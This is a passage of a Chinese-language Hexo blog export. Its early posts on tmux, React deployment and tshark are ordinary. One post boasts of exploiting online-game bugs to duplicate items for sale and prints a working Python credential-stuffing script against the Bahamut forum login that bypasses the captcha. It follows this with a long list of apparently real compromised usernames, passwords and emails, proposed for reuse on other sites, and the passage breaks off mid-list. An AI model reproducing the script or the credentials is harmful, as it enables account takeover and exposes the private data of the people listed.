PyTorch 會涼涼","slug":"python技術債草","published":1,"updated":"2025-06-03T23:14:08.483Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwad0010zrlr51i874sg","content":"<p>曾經的我  用python寫了很多代碼</p>\n<p>自從我用了C++後  發現python真TM狗屎</p>\n<p>打包難打包成exe就算了 會整台電腦一起打包 此時當你有安裝大型項目</p>\n<p>例如TensorFlow, PyTorch 會涼涼</p>\n","excerpt":"","more":"<p>曾經的我  用python寫了很多代碼</p>\n<p>自從我用了C++後  發現python真TM狗屎</p>\n<p>打包難打包成exe就算了 會整台電腦一起打包 此時當你有安裝大型項目</p>\n<p>例如TensorFlow, PyTorch 會涼涼</p>\n"},{"title":"tmux基礎","date":"2025-05-30T13:34:34.000Z","_content":"\ntmux attach -t 進入目標 名為hexo\n\n    tmux attach -t hexo\n\ntmux new -s創建一個會話 名為hexo\n\n    tmux new -s hexo\n\ntmux kill-session -t 刪除名為hexo的會話\n\n    tmux kill-session -t hexo\n\n進出\n\n    ctrl+b 再按d\n\n\n\n\n\n\n切換到編號1的視窗\n\n    tmux select-window -t hexo:1  \n\n\n刪除編號1的視窗\n\n    tmux kill-window -t hexo:1\n","source":"_posts/tmux基礎.md","raw":"---\ntitle: tmux基礎\ndate: 2025-05-30 21:34:34\ncategories:\n  - linux\n\n---\n\ntmux attach -t 進入目標 名為hexo\n\n    tmux attach -t hexo\n\ntmux new -s創建一個會話 名為hexo\n\n    tmux new -s hexo\n\ntmux kill-session -t 刪除名為hexo的會話\n\n    tmux kill-session -t hexo\n\n進出\n\n    ctrl+b 再按d\n\n\n\n\n\n\n切換到編號1的視窗\n\n    tmux select-window -t hexo:1  \n\n\n刪除編號1的視窗\n\n    tmux kill-window -t hexo:1\n","slug":"tmux基礎","published":1,"updated":"2025-06-01T17:21:23.440Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwad0011zrlrel994td3","content":"<p>tmux attach -t 進入目標 名為hexo</p>\n<pre><code>tmux attach -t hexo\n</code></pre>\n<p>tmux new -s創建一個會話 名為hexo</p>\n<pre><code>tmux new -s hexo\n</code></pre>\n<p>tmux kill-session -t 刪除名為hexo的會話</p>\n<pre><code>tmux kill-session -t hexo\n</code></pre>\n<p>進出</p>\n<pre><code>ctrl+b 再按d\n</code></pre>\n<p>切換到編號1的視窗</p>\n<pre><code>tmux select-window -t hexo:1  \n</code></pre>\n<p>刪除編號1的視窗</p>\n<pre><code>tmux kill-window -t hexo:1\n</code></pre>\n","excerpt":"","more":"<p>tmux attach -t 進入目標 名為hexo</p>\n<pre><code>tmux attach -t hexo\n</code></pre>\n<p>tmux new -s創建一個會話 名為hexo</p>\n<pre><code>tmux new -s hexo\n</code></pre>\n<p>tmux kill-session -t 刪除名為hexo的會話</p>\n<pre><code>tmux kill-session -t hexo\n</code></pre>\n<p>進出</p>\n<pre><code>ctrl+b 再按d\n</code></pre>\n<p>切換到編號1的視窗</p>\n<pre><code>tmux select-window -t hexo:1  \n</code></pre>\n<p>刪除編號1的視窗</p>\n<pre><code>tmux kill-window -t hexo:1\n</code></pre>\n"},{"title":"react撞牆","date":"2025-05-31T13:12:05.000Z","_content":"\n\nreact用的\n\n    npm install --save-dev gh-pages\n\n\n.git資料夾的遠端推送設定優先於所有設定  所以先看遠端 再改設定\n\n    git remote -v\n    git remote set-url origin git@github.com:itamiokanjiro/test.github.io.git\n\n\n一鍵部屬\n\n    rm -rf build && npm run build && npm run deploy\n\n\n靜態檔案package.json設定\n\n    \"homepage\": \"https://itamiokanjiro.github.io/test.github.io\",\n    \"devDependencies\": {\n    \"gh-pages\": \"^6.3.0\"\n    }\n\n改推送分之為main\n    \"scripts\": {\n        \"start\": \"react-scripts start\",\n        \"build\": \"react-scripts build\",\n        \"test\": \"react-scripts test\",\n        \"eject\": \"react-scripts eject\",\n        \"predeploy\": \"npm run build\",\n        \"deploy\": \"gh-pages -d build -b main\"\n    },\n    ","source":"_posts/react撞牆.md","raw":"---\ntitle: react撞牆\ndate: 2025-05-31 21:12:05\ntags:\ncategories:\n  - 網站部署基礎\n---\n\n\nreact用的\n\n    npm install --save-dev gh-pages\n\n\n.git資料夾的遠端推送設定優先於所有設定  所以先看遠端 再改設定\n\n    git remote -v\n    git remote set-url origin git@github.com:itamiokanjiro/test.github.io.git\n\n\n一鍵部屬\n\n    rm -rf build && npm run build && npm run deploy\n\n\n靜態檔案package.json設定\n\n    \"homepage\": \"https://itamiokanjiro.github.io/test.github.io\",\n    \"devDependencies\": {\n    \"gh-pages\": \"^6.3.0\"\n    }\n\n改推送分之為main\n    \"scripts\": {\n        \"start\": \"react-scripts start\",\n        \"build\": \"react-scripts build\",\n        \"test\": \"react-scripts test\",\n        \"eject\": \"react-scripts eject\",\n        \"predeploy\": \"npm run build\",\n        \"deploy\": \"gh-pages -d build -b main\"\n    },\n    ","slug":"react撞牆","published":1,"updated":"2025-06-01T17:21:33.861Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwad0013zrlr3660cqy9","content":"<p>react用的</p>\n<pre><code>npm install --save-dev gh-pages\n</code></pre>\n<p>.git資料夾的遠端推送設定優先於所有設定  所以先看遠端 再改設定</p>\n<pre><code>git remote -v\ngit remote set-url origin git@github.com:itamiokanjiro/test.github.io.git\n</code></pre>\n<p>一鍵部屬</p>\n<pre><code>rm -rf build &amp;&amp; npm run build &amp;&amp; npm run deploy\n</code></pre>\n<p>靜態檔案package.json設定</p>\n<pre><code>&quot;homepage&quot;: &quot;https://itamiokanjiro.github.io/test.github.io&quot;,\n&quot;devDependencies&quot;: &#123;\n&quot;gh-pages&quot;: &quot;^6.3.0&quot;\n&#125;\n</code></pre>\n<p>改推送分之為main<br>    “scripts”: {<br>        “start”: “react-scripts start”,<br>        “build”: “react-scripts build”,<br>        “test”: “react-scripts test”,<br>        “eject”: “react-scripts eject”,<br>        “predeploy”: “npm run build”,<br>        “deploy”: “gh-pages -d build -b main”<br>    },\n    </p>\n","excerpt":"","more":"<p>react用的</p>\n<pre><code>npm install --save-dev gh-pages\n</code></pre>\n<p>.git資料夾的遠端推送設定優先於所有設定  所以先看遠端 再改設定</p>\n<pre><code>git remote -v\ngit remote set-url origin git@github.com:itamiokanjiro/test.github.io.git\n</code></pre>\n<p>一鍵部屬</p>\n<pre><code>rm -rf build &amp;&amp; npm run build &amp;&amp; npm run deploy\n</code></pre>\n<p>靜態檔案package.json設定</p>\n<pre><code>&quot;homepage&quot;: &quot;https://itamiokanjiro.github.io/test.github.io&quot;,\n&quot;devDependencies&quot;: &#123;\n&quot;gh-pages&quot;: &quot;^6.3.0&quot;\n&#125;\n</code></pre>\n<p>改推送分之為main<br>    “scripts”: {<br>        “start”: “react-scripts start”,<br>        “build”: “react-scripts build”,<br>        “test”: “react-scripts test”,<br>        “eject”: “react-scripts eject”,<br>        “predeploy”: “npm run build”,<br>        “deploy”: “gh-pages -d build -b main”<br>    },\n    </p>\n"},{"title":"tshark","date":"2025-06-02T18:13:48.000Z","_content":"\nTShark Help\n\n    tshark -h\n\n\nwhere tshark\n\n    which tshark\n\ninterfaces List\n\n    tshark -D\n\nlist the Link-layer from interface\n\n    tshark -L\n    tshark -i ens33 -L\n\nswitch interface\n\n    tshark -i 2\n\nSelecting an Interface & Writing to a File\n\n    tshark -i eth0 -w /tmp/test.pcap\n\nSelecting an Interface & Applying Filters\n\n    tshark -i eth0 -f \"host 172.16.146.2\"\n\n|Switch Command\t|Result|\n|-----------|------------|\n|D |\tWill display any interfaces available to capture from and then exit out.|\n|L\t|Will list the Link-layer mediums you can capture from and then exit out. (ethernet as an example)|\n|i\t|choose an interface to capture from. (-i eth0)|\n|f\t|packet filter in libpcap syntax. Used during capture.|\n|c\t|Grab a specific number of packets, then quit the program. Defines a stop condition.|\n|a\t|Defines an autostop condition. Can be after a duration, specific file size, or after a certain number of packets.|\n|r |(pcap-file)\tRead from a file.|\n|W |(pcap-file)\tWrite into a file using the pcapng format.|\n|P\t|Will print the packet summary while writing into a file (-W)|\n|x\t|will add Hex and ASCII output into the capture.|\n|h\t|See the help menu|","source":"_posts/tshark.md","raw":"---\ntitle: tshark\ndate: 2025-06-03 02:13:48\ntags:\n---\n\nTShark Help\n\n    tshark -h\n\n\nwhere tshark\n\n    which tshark\n\ninterfaces List\n\n    tshark -D\n\nlist the Link-layer from interface\n\n    tshark -L\n    tshark -i ens33 -L\n\nswitch interface\n\n    tshark -i 2\n\nSelecting an Interface & Writing to a File\n\n    tshark -i eth0 -w /tmp/test.pcap\n\nSelecting an Interface & Applying Filters\n\n    tshark -i eth0 -f \"host 172.16.146.2\"\n\n|Switch Command\t|Result|\n|-----------|------------|\n|D |\tWill display any interfaces available to capture from and then exit out.|\n|L\t|Will list the Link-layer mediums you can capture from and then exit out. (ethernet as an example)|\n|i\t|choose an interface to capture from. (-i eth0)|\n|f\t|packet filter in libpcap syntax. Used during capture.|\n|c\t|Grab a specific number of packets, then quit the program. Defines a stop condition.|\n|a\t|Defines an autostop condition. Can be after a duration, specific file size, or after a certain number of packets.|\n|r |(pcap-file)\tRead from a file.|\n|W |(pcap-file)\tWrite into a file using the pcapng format.|\n|P\t|Will print the packet summary while writing into a file (-W)|\n|x\t|will add Hex and ASCII output into the capture.|\n|h\t|See the help menu|","slug":"tshark","published":1,"updated":"2025-06-02T18:26:11.319Z","comments":1,"layout":"post","photos":[],"_id":"cmbhtkwad0014zrlrh054e75w","content":"<p>TShark Help</p>\n<pre><code>tshark -h\n</code></pre>\n<p>where tshark</p>\n<pre><code>which tshark\n</code></pre>\n<p>interfaces List</p>\n<pre><code>tshark -D\n</code></pre>\n<p>list the Link-layer from interface</p>\n<pre><code>tshark -L\ntshark -i ens33 -L\n</code></pre>\n<p>switch interface</p>\n<pre><code>tshark -i 2\n</code></pre>\n<p>Selecting an Interface &amp; Writing to a File</p>\n<pre><code>tshark -i eth0 -w /tmp/test.pcap\n</code></pre>\n<p>Selecting an Interface &amp; Applying Filters</p>\n<pre><code>tshark -i eth0 -f &quot;host 172.16.146.2&quot;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Switch Command</th>\n<th>Result</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>D</td>\n<td>Will display any interfaces available to capture from and then exit out.</td>\n</tr>\n<tr>\n<td>L</td>\n<td>Will list the Link-layer mediums you can capture from and then exit out. (ethernet as an example)</td>\n</tr>\n<tr>\n<td>i</td>\n<td>choose an interface to capture from. (-i eth0)</td>\n</tr>\n<tr>\n<td>f</td>\n<td>packet filter in libpcap syntax. Used during capture.</td>\n</tr>\n<tr>\n<td>c</td>\n<td>Grab a specific number of packets, then quit the program. Defines a stop condition.</td>\n</tr>\n<tr>\n<td>a</td>\n<td>Defines an autostop condition. Can be after a duration, specific file size, or after a certain number of packets.</td>\n</tr>\n<tr>\n<td>r</td>\n<td>(pcap-file)\tRead from a file.</td>\n</tr>\n<tr>\n<td>W</td>\n<td>(pcap-file)\tWrite into a file using the pcapng format.</td>\n</tr>\n<tr>\n<td>P</td>\n<td>Will print the packet summary while writing into a file (-W)</td>\n</tr>\n<tr>\n<td>x</td>\n<td>will add Hex and ASCII output into the capture.</td>\n</tr>\n<tr>\n<td>h</td>\n<td>See the help menu</td>\n</tr>\n</tbody></table>\n","excerpt":"","more":"<p>TShark Help</p>\n<pre><code>tshark -h\n</code></pre>\n<p>where tshark</p>\n<pre><code>which tshark\n</code></pre>\n<p>interfaces List</p>\n<pre><code>tshark -D\n</code></pre>\n<p>list the Link-layer from interface</p>\n<pre><code>tshark -L\ntshark -i ens33 -L\n</code></pre>\n<p>switch interface</p>\n<pre><code>tshark -i 2\n</code></pre>\n<p>Selecting an Interface &amp; Writing to a File</p>\n<pre><code>tshark -i eth0 -w /tmp/test.pcap\n</code></pre>\n<p>Selecting an Interface &amp; Applying Filters</p>\n<pre><code>tshark -i eth0 -f &quot;host 172.16.146.2&quot;\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>Switch Command</th>\n<th>Result</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>D</td>\n<td>Will display any interfaces available to capture from and then exit out.</td>\n</tr>\n<tr>\n<td>L</td>\n<td>Will list the Link-layer mediums you can capture from and then exit out. (ethernet as an example)</td>\n</tr>\n<tr>\n<td>i</td>\n<td>choose an interface to capture from. (-i eth0)</td>\n</tr>\n<tr>\n<td>f</td>\n<td>packet filter in libpcap syntax. Used during capture.</td>\n</tr>\n<tr>\n<td>c</td>\n<td>Grab a specific number of packets, then quit the program. Defines a stop condition.</td>\n</tr>\n<tr>\n<td>a</td>\n<td>Defines an autostop condition. Can be after a duration, specific file size, or after a certain number of packets.</td>\n</tr>\n<tr>\n<td>r</td>\n<td>(pcap-file)\tRead from a file.</td>\n</tr>\n<tr>\n<td>W</td>\n<td>(pcap-file)\tWrite into a file using the pcapng format.</td>\n</tr>\n<tr>\n<td>P</td>\n<td>Will print the packet summary while writing into a file (-W)</td>\n</tr>\n<tr>\n<td>x</td>\n<td>will add Hex and ASCII output into the capture.</td>\n</tr>\n<tr>\n<td>h</td>\n<td>See the help menu</td>\n</tr>\n</tbody></table>\n"},{"title":"未來滲透思路","date":"2025-06-01T12:01:12.000Z","_content":"\n現今的滲透\n已經AI化了\n各種腳本  打下網站  \n\n大多數公司都使用cloudflare了 本身是有限制某些特殊參數傳入數據庫\n除非工程師程式邏輯有問題\n\n就像是如今全球服[精靈樂章](https://www.x-legend.com/online/grandfantasia-origin/zh-hant/) 的 API 整數溢出  在內存中 輸入(65536 / 2 -1) 就能觸發\n\n[幻想神域](https://ff.x-legend.com.tw/index_in.php) 台服的轉帳系統異常一樣\n\n都可以構成無限複製虛寶，販賣給玩家是有錢賺的。\n\n某些網站的帳密數據洩漏例如巴哈姆特，可以間接造成大量網站的防禦功能失效。\n\n台灣論壇巴哈姆特的防腳本Captcha存在漏洞，實際上不用點擊圖片就能無限制瘋狂登入測試帳密，對於駭客沒有起到防禦作用，頂多防治低端駭客。\n\n\n\n以下是巴哈姆特的exploit\n\n    import requests\n    import re\n    def login_gamer(i: str, b: str):\n        url = \"https://user.gamer.com.tw/ajax/do_login.php\"\n        boundary = \"----WebKitFormBoundary43kaavhQRXxSIS8T\"\n        alternativeCaptcha=\"00fc6930b735e3cad682e0853a5e7de13b89d97fd3ec5ad167f2ba6b\"\n\n        # Cookies  boundary  alternativeCaptcha 也要更新\n        cookies = {\n            \"_ga\": \"GA1.1.1957928680.1732967366\",\n            \"ckM\": \"2531167198\",\n            \"buap_modr\": \"p014\",\n            \"buap_puoo\": \"p301\",\n            \"ckGUILD_lastBrowse\": \"[[%22393%22%2C%22%E6%AD%B7%E5%8F%B2%E3%81%AE%E7%B4%B3%E5%A3%AB%E5%85%AC%E6%9C%83<%E3%82%9D%CF%89%E3%83%BB%22]%2C[%2216197%22%2C%22%E5%A0%B4%E5%A4%96%E4%BA%BA%E7%94%9F%22]]\",\n            \"__cf_bm\": \"mKDJpSKveQTKgl_fc6yuPtBbSyXcrhujBogkMvHPNso-1734356145-1.0.1.1-Q4xXxyx1VD13BCae5ygrGeY76tskUbcg3HDEXHnwcFUld5j1UZ_lbQKNVUun8pDMU5CvDEDJrPkzKFVo9ivUpA\",\n        }\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\",\n            \"Accept\": \"*/*\",\n            \"Accept-Encoding\": \"gzip, deflate, br, zstd\",\n            \"Accept-Language\": \"zh-TW,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7\",\n            \"Cache-Control\": \"no-cache\",\n            \"Origin\": \"https://user.gamer.com.tw\",\n            \"Pragma\": \"no-cache\",\n            \"Referer\": \"https://user.gamer.com.tw/login.php\",\n            \"X-Requested-With\": \"XMLHttpRequest\",\n            \"Content-Type\": f\"multipart/form-data; boundary={boundary}\"\n        }\n\n        body = (\n            f\"--{boundary}\\r\\n\"\n            \"Content-Disposition: form-data; name=\\\"userid\\\"\\r\\n\\r\\n\"\n            f\"{i}\\r\\n\"\n            f\"--{boundary}\\r\\n\"\n            \"Content-Disposition: form-data; name=\\\"password\\\"\\r\\n\\r\\n\"\n            f\"{b}\\r\\n\"\n            f\"--{boundary}\\r\\n\"\n            \"Content-Disposition: form-data; name=\\\"autoLogin\\\"\\r\\n\\r\\n\"\n            \"T\\r\\n\"\n            f\"--{boundary}\\r\\n\"\n            \"Content-Disposition: form-data; name=\\\"alternativeCaptcha\\\"\\r\\n\\r\\n\"\n            f\"{alternativeCaptcha}\\r\\n\"\n            f\"--{boundary}\\r\\n\"\n            \"Content-Disposition: form-data; name=\\\"twoStepAuth\\\"\\r\\n\\r\\n\"\n            \"\\r\\n\"\n            f\"--{boundary}--\\r\\n\"\n        )\n\n    \n        response = requests.post(url, headers=headers, cookies=cookies, data=body.encode(\"utf-8\"))\n\n\n        if '\"error\"' not in response.text:\n            print(f\"✅ Username: {i}, Password: {b}, Status Code: {response.status_code}\")\n            print(\"Response:\", response.text)\n\n            if i in usernames:\n                usernames.remove(i)\n                with open(\"9999.txt\", \"w\", encoding=\"utf-8\") as f:\n                    f.write('\\n'.join(usernames) + '\\n')\n\n            # 加入 99.txt\n            with open(\"99.txt\", \"a\", encoding=\"utf-8\") as f:\n                f.write(i + '\\n')\n\n        elif '\"CSRF_TOKEN_ERROR\"' in response.text:\n            print(f\"🚫 CSRF ERROR Username: {i}, Password: {b}, Status Code: {response.status_code}\")\n            print(\"Response:\", response.text)\n\n        return\n\n\n\n    with open(\"9999.txt\", \"r\", encoding=\"utf-8\") as file:\n        usernames = [line.strip() for line in file if line.strip()]\n\n    for i in usernames:\n        c = re.sub(r'[a-zA-Z]', 'a', i)\n        b = c.replace(\"aa\", \"a\")  \n        login_gamer(i, b)\n\n\n以下是戰利品，簡簡單單的腳本可以造成如此可怕的破壞性。 可以將其拿去撞庫其他網站。\n\n    Username: aa0903465890, Password: a0903465890, Status Code: 200  a0903465890@gmail.com 動漫風\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0952121590, Password: a0952121590, Status Code: 200  bodishenqi@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0909165363, Password: a0909165363, Status Code: 200 a0952148610@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0903892528, Password: a0903892528, Status Code: 200 b0903892528@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: w0906997609, Password: a0906997609, Status Code: 200 datealive24561715@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0907711641, Password: a0907711641, Status Code: 200 a0932602130@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0985883382, Password: a0985883382, Status Code: 200 b0985883382@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0902445622, Password: a0902445622, Status Code: 200 a0902445622@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: q0968223897, Password: a0968223897, Status Code: 200  a0968223897@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0910525, Password: a0910525, Status Code: 200 aa0928252609@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: e0973943179, Password: a0973943179, Status Code: 200 lovebaby19810802@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0918681748, Password: a0918681748, Status Code: 200 love0918681748@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: st0986808392, Password: a0986808392, Status Code: 200 st882810@yahoo.com.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: z0968954488, Password: a0968954488, Status Code: 200 gg122504531@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: q0935962575, Password: a0935962575, Status Code: 200 asdw95049@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0953956567, Password: a0953956567, Status Code: 200 a0953956567@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0987890752, Password: a0987890752, Status Code: 200 young30987@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: as0906566327, Password: a0906566327, Status Code: 200 a0906566327@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: f0916727293, Password: a0916727293, Status Code: 200\n    Response: {\"data\":{\"status\":1}}\n    Username: b09158500, Password: a09158500, Status Code: 200 b0909158500@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: jy0907007336, Password: a0907007336, Status Code: 200 chizhengyou535@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: zx0980821344, Password: a0980821344, Status Code: 200 a0980821344@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: a709980792, Password: a709980792, Status Code: 200 msn709980792@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: l0903019107, Password: a0903019107, Status Code: 200 adwx83@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: gg0910288118, Password: a0910288118, Status Code: 200 louser9487@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: c0905610929, Password: a0905610929, Status Code: 200 a0905610929@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: c0968908771, Password: a0968908771, Status Code: 200 gavin62115@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s097944987, Password: a097944987, Status Code: 200 jason930312@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: je0928511681, Password: a0928511681, Status Code: 200 a0928511681@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0916543726, Password: a0916543726, Status Code: 200 chan92726@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: l0909340420, Password: a0909340420, Status Code: 200 a0909340420@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: os0984028800, Password: a0984028800, Status Code: 200 \n    Response: {\"data\":{\"status\":1}}\n    Username: b0977300591, Password: a0977300591, Status Code: 200 a0977300591@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0965107208, Password: a0965107208, Status Code: 200 a0965107208@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0905795377, Password: a0905795377, Status Code: 200 aa0905795377@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0951115, Password: a0951115, Status Code: 200    s0951115@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: ji0966109453, Password: a0966109453, Status Code: 200 a0966109453@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: as0905427665, Password: a0905427665, Status Code: 200 a0905427665@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: p090749499, Password: pp090749499, Status Code: 200  p090749499@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: t0912287071, Password: tt0912287071, Status Code: 200  t091228.t7071@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: j090276, Password: jj090276, Status Code: 200 j090276@my.cmsh.cyc.edu.tw\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: aa0981073215, Password: aa0981073215, Status Code: 200  a0981073215@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: l0990209, Password: l0990209, Status Code: 200  z6865105@gmail.com shipeicen992@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: h10911218, Password: h10911218, Status Code: 200 kencatu@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: m0976722676, Password: m0976722676, Status Code: 200 scorpio2014520@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: j0905911501, Password: j0905911501, Status Code: 200 jeff29218829@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: f0980466920, Password: f0980466920, Status Code: 200 poror81333@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    ✅ Username: s0987550111, Password: s0987550111, Status Code: 200 s0987550111@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    以下密碼同帳號\n    ok0927719082  okok0927719082@gmail.com\n    m0965007291 s9007311@gmail.com\n    k0966525111  cruoen@gmail.com 2000-08-17 6889\n    k0963106226 k0963106226\n    aa0920686666  Aa0920686666@icloud.com\n    b0935429595 b0935429595@gmail.com\n    d09231202 willy5931@gmail.com\n    w0965572698\n    k0970283000 kaononog@gmail.com\n    vi0909211939 erli90889@gmail.com\n    js0975546884 js0975546884@gmail.com\n    s0970572524 w674961@gmail.com 這個\n    q0903571195 jay136001@gmail.com\n    aa0909503439 50014@thjh.tc.edu.tw\n    q0905394257 q0905394257@gmail.com\n    w0906181410\n    av0907325862 0963521qq@gmail.com  有\n    Username: aa09210035, Password: a09210035, Status Code: 200  a09210822@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: u0979254001, Password: a0979254001, Status Code: 200 unicorn0979254001@icloud.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0912633373, Password: a0912633373, Status Code: 200 aa0912633373@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: q0911805750, Password: a0911805750, Status Code: 200 a0911805750@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0966176188, Password: a0966176188, Status Code: 200\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0905292491, Password: a0905292491, Status Code: 200 abc092053@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0938918616, Password: a0938918616, Status Code: 200 a0938918616@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0960960809, Password: a0960960809, Status Code: 200 love088613559@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0920194989, Password: a0920194989, Status Code: 200 a0920194989@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0909591313, Password: a0909591313, Status Code: 200 cmy0909591313@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: r0972880749, Password: a0972880749, Status Code: 200 r0972880749@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0976681217, Password: a0976681217, Status Code: 200 a0976681217@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0960300399, Password: a0960300399, Status Code: 200 a0960300399@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0903060747, Password: a0903060747, Status Code: 200 a0903060747@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0903559094, Password: a0903559094, Status Code: 200 a090355909432@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: k0933944907, Password: a0933944907, Status Code: 200 annime284@icloud.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0905879083, Password: a0905879083, Status Code: 200 a0905879083@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: pe0988977410, Password: a0988977410, Status Code: 200 a0988977410@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0908279601, Password: a0908279601, Status Code: 200 csc908279601@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: m0905660182, Password: a0905660182, Status Code: 200 a0905660182@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0908550262, Password: a0908550262, Status Code: 200 a0908550262@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: as0966120010, Password: a0966120010, Status Code: 200 q0966120010@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: b0965332258, Password: a0965332258, Status Code: 200 a0965332258@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: t0909514986, Password: a0909514986, Status Code: 200 a0909514986@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0908365535, Password: a0908365535, Status Code: 200 b0908365535@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0980458882, Password: a0980458882, Status Code: 200 a871888@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: p0965494790, Password: a0965494790, Status Code: 200\n    Response: {\"data\":{\"status\":1}}\n    Username: yx0974043504, Password: a0974043504, Status Code: 200 a0974043504@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0979042990, Password: a0979042990, Status Code: 200 jess518313@yahoo.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0963566296, Password: a0963566296, Status Code: 200 a0963566296@yahoo.com.tw\n    Response: {\"data\":{\"status\":1}}\n    Username: s0928452731, Password: a0928452731, Status Code: 200 a0928452731@gmail.com st2630322@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0975285779, Password: a0975285779, Status Code: 200 a0975297472@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: z0911202824, Password: a0911202824, Status Code: 200 \n    Response: {\"data\":{\"status\":1}}\n    Username: aa0989569855, Password: a0989569855, Status Code: 200 -acps91152@gmail.com  -\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0912660626, Password: a0912660626, Status Code: 200 -a060943@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0909070825, Password: a0909070825, Status Code: 200 a0909070825@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: s0936780533, Password: a0936780533, Status Code: 200\n    Response: {\"data\":{\"status\":1}}\n    Username: b0979580968, Password: a0979580968, Status Code: 200 b0979580968@gmail.com  -\n    Response: {\"data\":{\"status\":1}}\n    Username: ab0902101002, Password: a0902101002, Status Code: 200 aa0902101002@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: b0985430586, Password: a0985430586, Status Code: 200 a0985430586@gmail.com\n    Response: {\"data\":{\"status\":1}}\n    Username: aa0906730857, Password: a0906730857, Status Code: 200 \n    Response: {\"data\":{\"status\":1}}\n    Username: aa0963756676, Password: a0963756676, Status Code: 200 a0963756676@gmail.com -\n    Response: {\"data\":{\"status\":1}}\n    Username: q0981388805, Password: a0981388805, Status Code: 200 weileyhu0813@yahoo.com.tw -\n    Response: {\"data\":{\"status\":1}}\n    Username: w0908450298, Password: a0908450298, Status Code: 200 